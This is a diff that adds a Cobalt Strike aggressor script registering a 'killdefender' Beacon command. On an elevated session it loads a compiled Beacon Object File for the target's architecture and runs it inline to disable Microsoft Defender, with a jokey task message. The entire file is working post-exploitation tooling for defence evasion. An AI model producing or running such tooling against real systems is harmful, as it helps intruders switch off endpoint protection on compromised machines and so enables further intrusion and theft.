@@ -1,0 +1,39 @@
+beacon_command_register("killdefender", "kill defender", "Example: killdefender");
+
+alias killdefender {
+	$barch = barch($1);
+	# read in the BOF file
+    $handle = openf(script_resource("killdefender" . $barch . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # you didn't compile BOF :(
+    if(strlen($data) == 0)
+    {
+        berror($1, "could not read bof file");
+        return;
+    }
+
+    if ((-isadmin $1)) 
+    {
+    	# announce what we're doing
+		btask($1, "Hold on to your butts! Killing Defender!");
+
+    	if (-is64 $1)
+    	{
+    		# spawn a Beacon post-ex job with the exploit DLL
+			beacon_inline_execute($1, $data, "go", $null);
+    	}
+    	else
+    	{
+    		# spawn a Beacon post-ex job with the exploit DLL
+			beacon_inline_execute($1, $data, "go", $null);
+    	}
+
+    } else
+    {
+        berror($1, "We require an elevated session (admin)");
+    }
+
+
+}
